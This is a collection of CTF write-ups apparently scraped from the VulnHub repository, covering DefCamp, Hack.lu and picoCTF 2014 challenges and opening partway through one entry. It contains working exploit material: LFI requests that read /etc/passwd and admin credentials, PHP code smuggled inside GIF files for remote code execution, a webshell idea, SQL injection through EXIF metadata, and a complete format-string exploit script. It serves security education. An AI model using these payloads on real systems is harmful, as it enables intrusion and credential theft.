4.0K Oct 17 01:40 ..\n-rw------- 1 guest guest    0 Oct 18 00:06 .bash_history\n-rw-r--r-- 1 guest guest  220 Oct 17 01:40 .bash_logout\n-rw-r--r-- 1 guest guest 3.6K Oct 17 01:40 .bashrc\ndrwx------ 2 guest guest 4.0K Oct 17 01:42 .cache\n-rw-r--r-- 1 guest guest  675 Oct 17 01:40 .profile\ndrwxr-xr-t 2 root  root  4.0K Oct 17 01:41 toolkit\n-rw------- 1 guest guest  777 Oct 18 00:06 .viminfo\n```\n\nFor some reason, we could use `tcpdump` to look at incoming traffic:\n\n```bash\nguest@n1:~/toolkit$ ./tcpdump\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes\n11:13:03.921683 IP n1.ssh > 10.13.37.1.52543: Flags [P.], seq 1154997930:1154998122, ack 2969808471, win 349, options [nop,nop,TS val 10598245 ecr 188495], length 192\n11:13:03.934082 IP 10.13.37.1.52543 > n1.ssh: Flags [.], ack 192, win 661, options [nop,nop,TS val 188517 ecr 10598245], length 0\n11:13:03.975864 IP 10.13.37.1.37658 > n1.41730: Flags [S], seq 2811437647, win 1024, options [mss 1369], length 0\n11:13:03.975882 IP n1.41730 > 10.13.37.1.37658: Flags [R.], seq 0, ack 2811437648, win 0, length 0\n11:13:03.987686 IP 10.13.37.1.43518 > n1.41511: Flags [S], seq 4021855713, win 1024, options [mss 1369], length 0\n11:13:03.987704 IP n1.41511 > 10.13.37.1.43518: Flags [R.], seq 0, ack 402185571\n```\n\nBut we're looking for a flag! I wanted to see what made the login page tick.\n\n```bash\nguest@n1:~/toolkit$ cat /var/www/html/index.php\n<?php\n\nerror_reporting(0);\nini_set('display_errors', 0);\n\nif(isset($_POST['pass']) && strlen($_POST['pass']) < 12) {\n    echo 'Validation failed: The password field too short.'; die();\n}\n\nif(isset($_POST['user'])) {\n  if($_POST['user'] == 'manager' && md5($_POST['pass']) == 'e701a78ce9d38201e9fc17737be0996d') {\n    echo 'The secret is behind <strong>0f388689dc4728cfde0de9a1ee47c8d3</strong>. Don\\'t tell anyone!';\n  } else {\n    echo 'Wrong username or password.';\n  }\n  die();\n}\n\n?>\n<!DOCTYPE html>\n...snip...\n```\n\nApparently, the flag is 'behind' `0f388689dc4728cfde0de9a1ee47c8d3`. This md5 hash decrypts to `ididyourmom`, which is also the flag. What a nasty secret this manager has!\n", "timestamp": "2025-10-24T11:40:12.895130"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/defcamp/network-200.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/defcamp/network-200.md", "content": "### Solved by barrebas\n\nAgain, we get a clue:\n\n`That ****ing manager got smarter. He moved to house number 22, but we got this: ****managers.pcap`\n\nHouse number 22 probably means that the ip address of this challenge is `10.13.37.21`. The pcap file contains network traffic of the manager logging in to the page at 10.13.37.21. Upon examination of this page, it seems it generates a nonce. This nonce is to encode the md5 of the password, which it then sent over as GET parameters.\n\nLooking at the pcap file, Swappage quickly identified this:\n\n```\nuser=manager&nonce=7413734ab666ce02cf27c9862c96a8e7&pass=3ecd6317a873b18e7dde351ac094ee3b\n```\n\nSo we need to reverse this nonce-based encryption to get the md5'ed password of manager. The source of the login page reveals that the nonce is valid for about 100 seconds and the function that is used to generate the encoded password:\n\n```javascript\n$('.hook-submit').click(function(){\n  var h1 = md5($('#pass').val());\n  var h2 = $('#nonce').val();\n  var xor = myxor(h1, h2);\n  $('#hiddenpass').val(xor);\n  setTimeout(function() { $('#form').submit(); }, 100);\n});\n```\n\nThis threw me off. I thought the nonce and md5 were `XOR`ed together. I couldn't be further from the truth. After wasting some time, I investigated the javascript:\n\n```javascript\n...snip...\n\nfunction hex2n(c) {\n\tif(is_numeric(c)) return parseInt(c);\n\treturn ord(c) - ord('a') + 10;\n}\n\nfunction n2hex(n) {\n\tif(n < 10) { return '' + n; }\n\treturn chr(ord('a') + n - 10);\n}\n\nfunction myxor(h1, h2) {\n\tvar xored = '';\n\tfor(i = 0; i<h1.length; i++) {\n\t\tvar c1 = h1.charAt(i);\n\t\tvar c2 = h2.charAt(i);\n\t\talert(hex2n(c1)); // DEBUG by barrebas\n\t\talert(hex2n(c2)); // DEBUG by barrebas\n\t\talert(n2hex((hex2n(c1) + hex2n(c2)) % 16)); // DEBUG by barrebas\n\t\txored += n2hex((hex2n(c1) + hex2n(c2)) % 16);\n \t}\n \treturn xored;\n}\n```\nWith a few carefully placed `alert()`s, I was able to figure out that the `myxor` function takes each hex character of the nonce and the md5. These values are converted to integers and then added together. After a modulus 16 the hex-representation of the result is added to the output.\n\nI wrote a small piece of python to do the reverse operation for me, given the nonce and the encoded md5:\n\n```python\n#!/usr/bin/python\n\nnonce = 'efa6085790a0294851202602a4833ad1'\nepass = '3ecd6317a873b18e7dde351ac094ee3b'\n\ndef makeHex(c):\n\treturn hex(c)[2:]\n\ndef getHex(c):\n\treturn int(''.join(('0',c)), 16)\n\noutput = ''\nfor i in range(len(epass)):\n\toutput += makeHex((getHex(epass[i]) - getHex(nonce[i])) % 16)\n\nprint output\n```\n\nThis returned the md5 of the managers' password: `cabaf0ddf21df38cbeb77c94a40e4654`. Unfortunately, the Mighty Google did not return any hits when searching for it. Who needs it anyway? We have the md5 of the password, all we need to do is to re-encode it with a new nonce and submit it! I refreshed the login page, grabbed the nonce and ran the following piece of python:\n\n```python\n#!/usr/bin/python\n\nnonce = 'efa6085790a0294851202602a4833ad1'\nepass = '3ecd6317a873b18e7dde351ac094ee3b'\npassval = 'cabaf0ddf21df38cbeb77c94a40e4654'\n\ndef makeHex(c):\n\treturn hex(c)[2:]\n\ndef getHex(c):\n\treturn int(''.join(('0',c)), 16)\n\noutput = ''\nfor i in range(len(epass)):\n\toutput += makeHex((getHex(passval[i]) + getHex(nonce[i])) % 16)\n\nprint output\n```\n\nThis returned a new, encoded md5 of the password. I copied it and entered `manager:idontcare` in the login form. I intercepted this request with TamperData, substituting the new, encoded md5 value for the old one and hit submit. Lo and behold:\n\n\n```\nThe secret is behind bb00403ebcbfa0748bcbee426acfdb5b :)\n```\n\nWhich is the md5 of `youtoo`, which thankfully was the proper flag!\n", "timestamp": "2025-10-24T11:40:13.007707"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/defcamp/web-200.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/defcamp/web-200.md", "content": "### Solved by barrebas, Swappage, and superkojiman\n\nsuperkojiman here. Navigating to the provided IP address 10.13.37.12 on a web browser displayed an image of a rose with the text. barrebas did the inital enumeration and found a /cms/admin directory containing a login form\n\n![](/images/2014/defcamp/web200/01.png)\n\nAfter looking through the source code, we realized it was running CMSMini. Swappage found an exploit at [http://www.exploit-db.com/exploits/28128/](http://www.exploit-db.com/exploits/28128/) that allowed us to read local files on the server. Eg:\n\n```\ncurl \"http://10.13.37.12/cms/admin/edit.php?path=&name=../../../../../../etc/passwd\"\n.\n.\n.\n<body>\n\n<table>\n  <tr>\n    <td>\n      <fieldset>\n        <legend>Edit page</legend>\n\n      <div class=\"formHelp\">Page body</div>\n\n<form action=\"save.php?what=page&path=&p=../../../../../../etc/passwd\" method=\"post\">\n<textarea name=\"content\" id=\"content\" cols=\"80\" rows=\"25\">\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nlibuuid:x:100:101::/var/lib/libuuid:/bin/sh\nsshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin\nmysql:x:102:104:MySQL Server,,,:/nonexistent:/bin/false\n</textarea>\n<input type=\"submit\" value=\"Save\" />\n</form>\n\n</fieldset>\n    </td>\n\n    <td>\n      <fieldset>\n.\n.\n.\n```\n\nTo get a better idea of what interesting files I could read, I downloaded a copy of cmsmini-0.2.2 and found a file called config.php. I was able to use the local file inclusion vulnerability to get the contents of the file which had the admin login and password:\n\n```\ncurl \"http://10.13.37.12/cms/admin/edit.php?path=&name=../../../../../../var/www/cms/admin/config.php\"\n.\n.\n.\n$admin_login = 'admin';\n$admin_pass = 'RosesmaysayIloveyoubutthecactussaysFuckoff';\n```\n\nThe admin_pass turned out to be the flag.\n", "timestamp": "2025-10-24T11:40:13.206574"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/defcamp/web-300.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/defcamp/web-300.md", "content": "### Solved by barrebas\n\nWe are again given an ip address. Upon visiting, it turns out to be some rudimentary page. I immediately spotted a LFI vulnerability, surfing to `http://10.13.37.13/?page=../../../../../../etc/passwd`:\n\n\n```\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nlibuuid:x:100:101::/var/lib/libuuid:\nsshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin\nsyslog:x:102:105::/home/syslog:/bin/false\nubuntu:x:1000:1000::/home/ubuntu:/bin/bash\n```\n\nCool, but I couldn't get further with this. The images are apparently served by TimThumb, as I got this trying to do a LFI in `http://10.13.37.13/tt.php?w=240&src=../../../../../etc/passwd`:\n\n```\nfile not found\nQuery String : w=240&src=../../../../../etc/passwd\nTimThumb version : 1.33\n```\n\n[TimThumb v1.33](http://markmaunder.com/2011/08/02/technical-details-and-scripts-of-the-wordpress-timthumb-php-hack/) is vulnerable to RCE. The trick is to upload a malicious JPEG or GIF. This image contains php code, which is also uploaded into the thumbnail. This thumbnail is then stored into the `cache` directory. Indeed, externally uploaded images files are uploaded there, but only from domains that are in the whitelist. Luckily, `photobucket` is one of them. I made a black GIF image with a little bit of php appended:\n\n```php\n<?php\necho \"Hi\";\n?>\n```\n\nAfter uploading it to photobucket, I browsed to `http://10.13.37.13/tt.php?w=2400&src=http://i36.photobucket.com/albums/e31/sbsebastian1/pwn_zpsa043d8a3.gif`. If you then take the md5 of the request, you can figure out where this image file is saved:\n\n```bash\n$ echo -ne 'http://i36.photobucket.com/albums/e31/sbsebastian1/pwn_zpsa043d8a3.gif' |md5sum\n995e80b11b06e24b7d96ce109f4ef217  -\n```\n\nThis particular file was stored at `./cache/external_995e80b11b06e24b7d96ce109f4ef217` so I hit the first LFI with that image: `http://10.13.37.13/?page=./cache/external_995e80b11b06e24b7d96ce109f4ef217`. Besides a lot of garbage, I also got 'Hi'. No php tags, just 'Hi'. This meant that it was indeed executing php code! I attempted to upload a reverse php shell and a simple `system($_GET['cmd']);` webshell, but both failed. I suspect `system()` is being blocked or filtered. Frustrated, I uploaded a GIF with the following php code:\n\n```php\n...gifdata...\n<?php\necho \"HI FROM VULNHUB-CTF\";\necho `ls -alh`;\n?>\n```\n\nThis gave me a directory listing:\n\n```\nHI FROM VULNHUB-CTFtotal 116K\n\ndrwxr-xr-x 6 root root 4.0K Oct 12 12:36 .\ndrwxr-xr-x 3 root root 4.0K Oct 12 12:35 ..\n-rw-r--r-- 1 root root 12 Oct 12 12:09 575b3f3f5318b2afbfe91ed860a4b10c.txt\ndrwxrwxrwx 2 root root 52K Oct 18 15:14 cache\n-rw-r--r-- 1 root root 2.7K Oct 12 12:08 contact.html\ndrwxr-xr-x 2 root root 4.0K Aug 29 12:19 css\n-rw-r--r-- 1 root root 2.9K Oct 12 12:04 home.html\ndrwxr-xr-x 2 root root 4.0K Aug 29 12:19 images\n-rw-r--r-- 1 root root 180 Oct 12 12:03 index.php\ndrwxr-xr-x 2 root root 4.0K Aug 29 12:19 js\n-rw-r--r-- 1 root root 21K Jul 31 2011 tt.php\n```\n\nThis file called `575b3f3f5318b2afbfe91ed860a4b10c.txt` looked suspicious, so I uploaded a new GIF/php hybrid.\n\n```php\n...gifdata...\n<?php\necho \"HI FROM VULNHUB-CTF\";\necho `cat 575b3f3f5318b2afbfe91ed860a4b10c.txt`;\n?>\n```\n\nAfter hitting the LFI again, I was presented with the flag: `johnnybravo`!\n", "timestamp": "2025-10-24T11:40:13.269105"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/hack-dot-lu/the-union.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/hack-dot-lu/the-union.md", "content": "### Solved by barrebas\n\nHack.lu 2014 was a very fun, western-themed CTF. For `the Union`, we were given an executable and a place to connect to. We need to find `secret.txt` and the hint is that \"not everything is what it seems\". Uh-huh. \n\n![](/images/2014/hack.lu/theunion/00.png)\n\nUpon connecting, the program asks for the union's slogan and secret word:\n\n```bash\nbas@tritonal:~$ nc wildwildweb.fluxfingers.net 1423\n\tWelcome to \n _   _                        _             _     \n| |_| |__   ___   _   _ _ __ (_) ___  _ __ ( )___ \n| __| '_ \\ / _ \\ | | | | '_ \\| |/ _ \\| '_ \\|// __|\n| |_| | | |  __/ | |_| | | | | | (_) | | | | \\__ \\\n \\__|_| |_|\\___|  \\__,_|_| |_|_|\\___/|_| |_| |___/\n\n\t\t\tmining archive.\n\nPlease give the unions slogan and secret word:\n```\n\nWe have neither. Time to fire up the binary in `gdb`. I also uploaded it to [the Retargetable Decompiler](http://decompiler.fit.vutbr.cz/decompilation/). The binary looks for a file called `salt.txt`. I made a file with only `0` as contents. Using the output of the Retargetable Decompiler, I spotted the `strcmp` that checks the user-supplied password. It looks like it checks against `%,(!x4!%<.>`, but I figured that it does a bit of decoding. In `gdb`, I set a breakpoint on `strcmp`:\n\n```bash\ngdb-peda$ p strcmp\n$1 = {<text variable, no debug info>} 0x8048660 <strcmp@plt>\ngdb-peda$ b *0x8048660\nBreakpoint 1 at 0x8048660\ngdb-peda$ r\n...snip...\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd44c --> 0x80489c9 (test   eax,eax)\n0004| 0xffffd450 --> 0xffffd497 (\"BLEH\")\n0008| 0xffffd454 --> 0x804c818 (\"gold>silver0\\n\")\n0012| 0xffffd458 --> 0xc ('\\x0c')\n0016| 0xffffd45c --> 0xf7fbb000 --> 0x1a6da8 \n0020| 0xffffd460 --> 0x4 \n0024| 0xffffd464 --> 0xb ('\\x0b')\n0028| 0xffffd468 --> 0x0 \n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 1, 0x08048660 in strcmp@plt ()\n```\n\nSo the slogan seems to be `gold>silver`, and then the contents of `salt.txt` is appended. But how do we know what `salt.txt` contains on the remote server? I had another looks at the output of the Decompiler, and this bit stuck out:\n\n![](/images/2014/hack.lu/theunion/01.png)\n\nOnly the first byte of `salt.txt` is used! This makes it easy to bruteforce it. \n\n```python\n#!/usr/bin/python\nfrom socket import *\n\ns=socket(AF_INET, SOCK_STREAM)\ns.connect(('wildwildweb.fluxfingers.net', 1423))\n\nprint s.recv(1024)\nprint s.recv(256)\n\nfor x in range(256):\n        s.send('gold>silver'+chr(x)+'\\n')\n        print s.recv(256)\ns.close()\n```\n\nThis led us to finding that the full password is `gold>silverb`. Nice! Next, we where presented with a menu:\n\n```bash\n\tWelcome to \n _   _                        _             _     \n| |_| |__   ___   _   _ _ __ (_) ___  _ __ ( )___ \n| __| '_ \\ / _ \\ | | | | '_ \\| |/ _ \\| '_ \\|// __|\n| |_| | | |  __/ | |_| | | | | | (_) | | | | \\__ \\\n \\__|_| |_|\\___|  \\__,_|_| |_|_|\\___/|_| |_| |___/\n\n\t\t\tmining archive.\n\nPlease give the unions slogan and secret word:\ngold>silverb\nCorrect slogan.\n\n1) Add mine\n2) Show mines\n3) Delete mine\n4) Show profit\n5) Exit\n```\n\nAfter poking around, I found a string format exploit in the `Add mine` and `Show profit` function. This little bit shows we have control over the format string:\n\n```bash\nDo you want to see the profit?\nLocation: %11$x-%12$x\nType: AABBBBCCCC\ny/n\ny\nProfit for location:\n42424242-43434343\nAABBBBCCCC\n666\n```\n\nWe poked around the binary a bit more and Swappage identified the secret trapdoor function at `0x8049208`. It turns out that we could reach this function also when `99` is entered on the menu:\n\n```bash\n99\nUfff! You found our trapdoor.\nOk here you go. Everything in here is not what it seems to be.\nIf you do not understand this, you are not quite there yet.\n```\n\nI wrote a small python script that exploits the string format bug so that it writes the address `0x8049208` to `free@plt`. Next, the script invokes `Delete mine` so that `free()` is called, but this actually points to the trapdoor function. When executing this script locally, I noticed that `/bin/sh` threw an error message, indicating that `system()` is called somehow. But upon examination of the binary, I could not find *any* calls to `system()`, `execve` or even `int 0x80`! What was going on here? `hopper` shed some light on this function:\n\n![](/images/2014/hack.lu/theunion/02.png)\n\nThere is a piece of code that is never actually executed when this trapdoor function is called from the menu, the `printf`. Oddly, the rest of the binary uses `putf`. I ran `gdb` and examined the pointer that is used and compare it to `printf`... It wasn't the same! On a hunch, I compared it to `system()`, which did match! So indeed, not everything is what it seems. With this in mind, we can modify the string format exploit. It should write the address of `printf@plt` to `free@plt`, so when a string is freed, `system()` is called with that string as argument. Command execution, here we come!\n\n```python\n#!/usr/bin/python\n\nfrom socket import *\nimport time\n\n# connect to remote server\ns=socket(AF_INET, SOCK_STREAM)\ns.connect(('wildwildweb.fluxfingers.net', 1423))\n\n# receive & print banner\ntime.sleep(1)\nprint s.recv(1024)\ntime.sleep(1)\n\n# send passphrase\ns.send('gold>silverb\\n')\ntime.sleep(0.05)\nprint s.recv(512)\n\n# delete all mines, makes it easier later\ns.send('3\\n')\ns.send('y\\n')\ntime.sleep(0.05)\nprint s.recv(512)\ns.send('3\\n')\ns.send('y\\n')\ntime.sleep(0.05)\nprint s.recv(512)\ns.send('3\\n')\ns.send('y\\n')\ntime.sleep(0.05)\nprint s.recv(512)\n\n# add mine, supply a string format argument which\n# overwrites the first two bytes of free@plt pointer\ntime.sleep(0.05)\ns.send('1\\n')\ntime.sleep(0.05)\nprint s.recv(512)\n# we need to write the value 0x85e0, which is 34272 \n# in decimal\ns.send('%34272c%11$hn\\n') \ntime.sleep(0.05)\nprint s.recv(512)\n\n# pointer to free@plt\ns.send('AA\\x14\\xb0\\x04\\x08CCCC\\n')\ntime.sleep(0.05)\nprint s.recv(512)\n\n# don't care\ns.send('666\\n')\ntime.sleep(0.05)\nprint s.recv(512)\n\n# invoke Show Profit && trigger format string exploit\ns.send('4\\n')\ntime.sleep(0.05)\nprint s.recv(512)\ns.send('y\\n')\n\n# receive dummy bytes\nfor i in range(342):\n\ttime.sleep(0.01)\n\ts.recv(100)\nprint s.recv(256)\n\n# add mine, supply a string format argument which\n# overwrites the last two bytes of free@plt pointer\ns.send('1\\n')\ntime.sleep(0.05)\nprint s.recv(512)\n\n# we need to write the value 0x0804, which is 2052 \n# in decimal\ns.send('%2052c%11$hn\\n') # -> 0x804 in hex\ntime.sleep(0.05)\nprint s.recv(512)\n\n# pointer to free@plt+2\ns.send('AA\\x16\\xb0\\x04\\x08CCCC\\n') \ntime.sleep(0.05)\nprint s.recv(512)\n\n# don't care\ns.send('666\\n')\ntime.sleep(0.05)\nprint s.recv(512)\n\n# invoke Show Profit && trigger format string exploit\ns.send('4\\n')\ntime.sleep(0.05)\nprint s.recv(512)\ns.send('n\\n')\ntime.sleep(0.05)\nprint s.recv(512)\ns.send('y\\n')\ntime.sleep(0.05)\n\n# receive extra bytes (from the string format exploit)\nprint s.recv(2400)\n\n# send payload, in another mine. we're going to delete it \n# right away to call system()\ntime.sleep(0.05)\ns.send('1\\n')\ntime.sleep(0.05)\nprint s.recv(512)\n\n# shell command goes here\ns.send('cat secret.txt 2&>1\\n') \ntime.sleep(0.05)\nprint s.recv(512)\n\n# second command\ns.send('bleh\\n') #0x804b02c\ntime.sleep(0.05)\nprint s.recv(512)\n\n# third command\ns.send('blah\\n')\ntime.sleep(0.05)\nprint s.recv(512)\n\n# invoke Delete Mine, which triggers system() which our commands\ns.send('3\\n')\ntime.sleep(0.05)\nprint s.recv(512)\ns.send('n\\n')\ntime.sleep(0.05)\nprint s.recv(512)\ns.send('n\\n')\ntime.sleep(0.05)\nprint s.recv(512)\ns.send('y\\n')\ntime.sleep(0.05)\nprint s.recv(512)\n\ntime.sleep(0.05)\nprint s.recv(512)\n\t\ns.close()\n```\n\nAfter running this exploit, it returns the flag:\n\n```bash\n3^JDo you want to delete?\nLocation: %34272c%11$hn\nType: AA..CCCC\ny/n\n\nn^JDo you want to delete?\nLocation: %2052c%11$hn\nType: AA..CCCC\ny/n\n\nn^JDo you want to delete?\nLocation: cat secret.txt 2&>1\nType: bleh\ny/n\n\ny^JFLAG{d1aM0nd>G0lD}\n1) Add mine\n2) Show mines\n3) Delete mine\n4) Show profit\n5) Exit\nid^J\n```\n\nThe flag is `flag{d1aM0nd>G0lD}`. \n", "timestamp": "2025-10-24T11:40:13.899133"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/hack-dot-lu/wild-wild-web.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/hack-dot-lu/wild-wild-web.md", "content": "### Solved by Swappage and barrebas\n\nImage upload was a web challenge for the hack.lu CTF, providing a login form, and the possibility to upload images.\n\n![](/images/2014/hack.lu/wildwildweb/imageupload.png)\n\nWhat I could immediatelly notice was that there was a pretty strong sanitization of the uploaded content, both in terms of mimetype as well as for the file extension; it was possible to upload php code of course, but you would need to upload it as .jpg, and make sure the mimetype in the multypart form data was correct or an error was returned.\n\nplus, once an image was uploaded, it was modified and embedded into a mugshot.\n\n![](/images/2014/hack.lu/wildwildweb/uploaded.png)\n\nSo the way of the file inclusion wasn't a good idea, as most likely the code would have been scrumbled, modified or messed up, resulting in something broken.\n\nYet, if we were to look at the bottom of every image, we could notice that there were fields ready for displaying images detail in case they were present.\n\n![](/images/2014/hack.lu/wildwildweb/metadata.png)\n\nAuthor, Manufacturer, and Model are EXIF metadata in jpg images, so the application was probably reading these metadata from our uploaded images, and store them into the database for displaying them later.\n\nSo i decided it was worth a shot and try to trigger a SQL injection.\n\nBy using exiftool, a command line tool for displaying and manipulating exif metadata in various documents and images formats, I tried modifying the Manufacturer field by a *'*\n\n\texiftool -Make=\"'\" image.jpg\n\t\nand the web application reacted badly complying about an error in inserting data into the database.\n\nOk, nice, so we most likely had a SQL Injection.\n\nIt took me some trial and error but finally, with the precious help of Barrebas we found a way to correctly close the insert query and have proper responses in the metadata fields; by storing the following string in the Make metadata\n\n\ta', @@version ) -- #\n\nwe were presented with a nice result\n\n![](/images/2014/hack.lu/wildwildweb/sqli.png)\n\nAt this point i started enumerating the database replacing the *@@version* with proper queries that would eventually provide me with the informations about the databases, schemas and tables.\n\nI found the database namw was chal:\n\texiftool -Make=\"a', (SELECT schema_name FROM information_schema.schemata where schema_name != 'mysql' AND schema_name != 'information_schema' LIMIT 1) ) -- #\"\n\nStarted enumerating tables in the database\n```sql\n\tSELECT table_name FROM information_schema.tables WHERE table_schema = 'chal' LIMIT 1\n```\n\ntill I finally reached the users table\n\n![](/images/2014/hack.lu/wildwildweb/tablename.png)\n\nAt this point i needed the fields name\n\n```sql\n\tSELECT column_name FROM information_schema.columns WHERE table_schema = 'chal' AND table_name = 'users' LIMIT 1\n```\nwhich resulted being *id, name* and *password*\n\nto finally extract them\n\n```sql\n\tSELECT concat(name, ';', password) from chal.users LIMIT 1\n```\n\n![](/images/2014/hack.lu/wildwildweb/login.png)\n\nUsing the credentials displayed in the above image it was possible to login in the web application and receive the flag.\n\n\tYou are sucessfully logged in.\n\tFlag: flag{1_5h07_7h3_5h3r1ff}\n\t\n", "timestamp": "2025-10-24T11:40:14.042727"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/baleful.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/baleful.md", "content": "### Solved by barrebas and superkojiman\n\n#### Solving it with Pin\n\nsuperkojiman here. I started off doing the usual analysis with gdb, IDA, and Hopper on the binary. barrebas was working on the same challenge as well, and while I was trying to make sense of the massive jump table at 0x0804898B, barrebas sent me a link to post by Jonathan Salwan titled [A binary analysis, count me if you can](http://shell-storm.org/blog/A-binary-analysis-count-me-if-you-can/). The post describes using a a tool called [Pin](https://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool) to count the number of instructions executed by a binary to guess the password. Much like baleful, Jonathon used it to solve a crackme, so we thought, why not give it a shot. \n\nI downloaded pin-2.12-58423-gcc.4.4.7-linux.tar.gz, unpacked it and compiled it. \n\n```\n# tar xvzf pin-2.12-58423-gcc.4.4.7-linux.tar.gz\n# cd pin-2.12-58423-gcc.4.4.7-linux/source/tools\nmake\n```\n\nIt should fail with an error regarding Tsx:\n\n```\nmake -k -C Tsx\nmake: Entering an unknown directory\nmake: *** Tsx: No such file or directory.  Stop.\nmake: Leaving an unknown directory\nmake[1]: [Tsx.build] Error 2 (ignored)\nmake[1]: Leaving directory `/root/baleful/pin-2.12-58423-gcc.4.4.7-linux/source/tools'\n```\n\nNot a problem, we only need source/tools/ManualExamples/obj-ia32/inscount0.so built, and it should have been built properly. Finally, copied the unpacked baleful into pin-2.12-58423-gcc.4.4.7-linux \n\nSo the first thing that needs to be done is to determine how many characters the password is. From looking at the start of the jump table in IDA, we can see that it expects to loop through the input 30 times, so we know it's 30 characters long. However if we didn't know this, we can assume that the check on the password wouldn't occur until the binary got the correct password length. We can guess the password length by using pin: \n\n```\n# ./pin -t source/tools/ManualExamples/obj-ia32/inscount0.so -- ./baleful <<< \"a\" > /dev/null 2>&1; cat inscount.out \nCount 688964\n\n# ./pin -t source/tools/ManualExamples/obj-ia32/inscount0.so -- ./baleful <<< \"aa\" > /dev/null 2>&1; cat inscount.out \nCount 689815\n\n# ./pin -t source/tools/ManualExamples/obj-ia32/inscount0.so -- ./baleful <<< \"aaa\" > /dev/null 2>&1; cat inscount.out \nCount 690666\n```\n\nI ran it three times, and notice that the instruction count changes each time. There's a difference of 851 instructions between each run. The idea is to run it until the difference changes, which indicates that we've guessed the correct password length, and so the binary has started checking each character in the password to determine if it's correct. To simplify the procedure, I wrote a script: \n\n\n```bash\n# ./bale_count.sh \ndiff between a:1 and aa:2 = 851\ndiff between aa:2 and aaa:3 = 851\ndiff between aaa:3 and aaaa:4 = 851\ndiff between aaaa:4 and aaaaa:5 = 851\n.\n.\n.\ndiff between aaaaaaaaaaaaaaaaaaaaaaaaaa:26 and aaaaaaaaaaaaaaaaaaaaaaaaaaa:27 = 851\ndiff between aaaaaaaaaaaaaaaaaaaaaaaaaaa:27 and aaaaaaaaaaaaaaaaaaaaaaaaaaaa:28 = 851\ndiff between aaaaaaaaaaaaaaaaaaaaaaaaaaaa:28 and aaaaaaaaaaaaaaaaaaaaaaaaaaaaa:29 = 851\ndiff between aaaaaaaaaaaaaaaaaaaaaaaaaaaaa:29 and aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:30 = 48459\naaaaaaaaaaaaaaaaaaaaaaaaaaaaa and aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa have different instruction count\n```\n\nSure enough the difference between 29 characters and 30 characters is a whopping 48,459 indicating that more instructions were executed. Now that we have the password length, we can brute force the password character by character. The program exits when the incorrect character is guessed, so like before, we should get the same difference between each run when the password is incorrect. \n\nMy initial tests had a typo which generated incorrect results, and so I dismissed it thinking that I couldn't apply the technique to this challenge. By the time I decided to take a look at it again, barrebas had managed to manually solve a good part of the password. It was at this point I noticed the typo and realized that it was possible to automate solving the rest of the challenge. \n\nLet's take a look at how this works:\n\n```text\n# ./pin -t source/tools/ManualExamples/obj-ia32/inscount0.so -- ./baleful <<< \"a_____________________________\" > /dev/null 2>&1 ; cat inscount.out \nCount 761215\n\n# ./pin -t source/tools/ManualExamples/obj-ia32/inscount0.so -- ./baleful <<< \"b_____________________________\" > /dev/null 2>&1 ; cat inscount.out \nCount 761215\n\n# ./pin -t source/tools/ManualExamples/obj-ia32/inscount0.so -- ./baleful <<< \"c_____________________________\" > /dev/null 2>&1 ; cat inscount.out \nCount 761215\n```\n\nThere's a difference of 0 between each run. We assume that the password must be within the printable ASCII range, so once again, I wrote a script to brute force each character: 